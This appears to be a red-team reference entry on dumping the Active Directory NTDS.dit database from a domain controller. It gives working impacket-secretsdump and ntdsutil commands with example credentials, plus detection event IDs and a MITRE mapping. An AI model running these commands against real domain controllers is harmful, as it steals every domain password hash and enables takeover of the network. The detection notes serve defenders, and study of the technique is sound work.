---
id: ntds_dump
type: technique
label: "NTDS.dit extraction"
phase: "cred"
tools: ["impacket", "certsync"]
cve: null
detect: "4662 on the NTDS object; VSS shadow-copy events on a DC."
mitre: "T1003.003"
tag: null
---


# NTDS.dit extraction

### Affected object / attribute
**`NTDS.dit`** on a DC.

### Concept (deep)
`NTDS.dit` contains every domain hash. Extract via VSS/`ntdsutil` on a DC, or remotely via `secretsdump` (DRSUAPI/VSS).

### Commands
```bash
# ── Remote secretsdump ───────────────────────────────────────────────
impacket-secretsdump corp.local/administrator:'Password123!'@10.10.10.5 -just-dc-ntds

# ── On DC: ntdsutil IFM ──────────────────────────────────────────────
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ifm" quit quit
```

### Detection
VSS creation (**8222**), `ntdsutil` execution (**4688**), **4662** mass reads; Tier-0 DC access control.

---
